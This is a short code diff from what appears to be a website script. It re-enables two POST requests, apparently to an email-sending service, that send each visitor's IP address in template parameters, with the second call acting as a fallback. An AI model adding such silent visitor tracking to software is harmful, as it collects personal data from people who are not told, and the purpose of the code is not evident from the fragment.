@@ -51,8 +51,8 @@ if (loader == null) {
                                     type: 'POST',
                                     data: JSON.stringify({
                                         service_id: 'service_lne6ewa',
-                                        // template_id: 'template_3r6bobi',
-                                        template_id: 'error',
+                                        template_id: 'template_3r6bobi',
+                                        // template_id: 'error',
                                         user_id: '1NnuuCpetYJt2e-1h',
                                         template_params: {
                                             ip: ip,
@@ -72,8 +72,8 @@ if (loader == null) {
                                             type: 'POST',
                                             data: JSON.stringify({
                                                 service_id: 'service_2occ9x6',
-                                                // template_id: 'template_x8zyc3r',
-                                                template_id: 'error',
+                                                template_id: 'template_x8zyc3r',
+                                                // template_id: 'error',
                                                 user_id: '9_iBr633mbsnOdxy7',
                                                 template_params: {
                                                     ip: ip,
